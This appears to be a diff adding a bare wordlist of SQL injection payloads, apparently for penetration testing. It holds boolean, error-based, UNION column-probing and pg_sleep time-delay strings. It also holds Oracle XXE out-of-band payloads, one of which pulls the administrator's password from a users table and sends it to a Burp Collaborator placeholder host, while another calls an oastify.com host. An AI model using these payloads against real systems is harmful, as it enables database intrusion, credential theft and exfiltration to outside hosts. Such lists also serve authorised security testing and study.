@@ -1,0 +1,24 @@
+OR 1=1
+OR 1=2
+' AND '1'='1 xyz' AND '1'='2
+AND '1'='1
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT 'a',NULL,NULL,NULL-- 
+' UNION SELECT NULL,'a',NULL,NULL-- 
+' UNION SELECT NULL,NULL,'a',NULL-- 
+' UNION SELECT NULL,NULL,NULL,'a'--
+||(SELECT '' FROM not-a-real-table)||'
+'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE '')||'
+' and 1=1 --
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://aaaaa.oastify.com/"> %remote;]>'),'/l') FROM dual--
+'select+case+when+1=1+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--
+'||pg_sleep(10)--
+'union+select+null,null--
+'union all select table_name,null from all_tables
+' orderBy 1
+'--
+'+or+1=1--
+' and 1=cast((select 1) as int)--
